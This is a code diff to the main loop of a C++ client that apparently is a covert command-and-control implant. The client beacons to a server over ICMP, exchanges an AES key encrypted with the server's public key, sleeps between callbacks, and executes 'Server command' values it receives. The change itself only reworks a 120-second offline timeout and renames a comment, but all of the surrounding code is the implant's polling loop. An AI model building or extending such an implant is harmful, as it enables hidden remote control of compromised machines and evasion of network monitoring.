@@ -6,6 +6,8 @@
 using namespace std;
 using namespace Helper;
 
+
+
 int main(int argc, char* argv[]) {
 
     // Create a client with a unique ID (for example, ID = 1)
@@ -34,20 +36,20 @@ int main(int argc, char* argv[]) {
 
         SOCKET sockfd = icmp.createSocket();
         if (!client->isConnected()) {
-           
+            serverOffline += client->getTimeout() / 1000;
+            if (serverOffline > 120) {
+                std::cout << "\033[31m" << "[-] No response from SERVER within the last " << serverOffline << " seconds\n[-] Terminating..." << "\033[0m" << "\n\n";
+                exit(0);
+            }
             std::cout << "[*] Generating AES key and nonce" << "\n";
             // First send aes key and nonce encrypted with server public key
             aesHandler->InitAES(sockfd, icmp, client->getIP(), client->isConnected());
-            serverOffline += client->getTimeout();
-            if (serverOffline > 120 * 1000) {
-                std::cout << "\033[31m" << "[-] No response from SERVER within the last " << serverOffline / 1000 << " seconds\n[-] Terminating..." << "\033[0m" << "\n\n";
-                exit(0);
-            }
+            
             cout << "[*] Waiting for command. Sleeping " << client->getTimeout()/1000 << "s..." << "\n\n";
             Sleep(client->getTimeout());
         } else {
             serverOffline = 0;
-            // Sends a callback to the server to check for any new potatoes
+            // Sends a callback to the kitchen to check for any new potatoes
             Callback(sockfd, icmp, client->getIP(), client->isConnected(), false);
             std::cout << "\033[36m" "[*] Server command: " << client->getServerCommand() << "\033[0m" << "\n";;
             // Handle server command if any
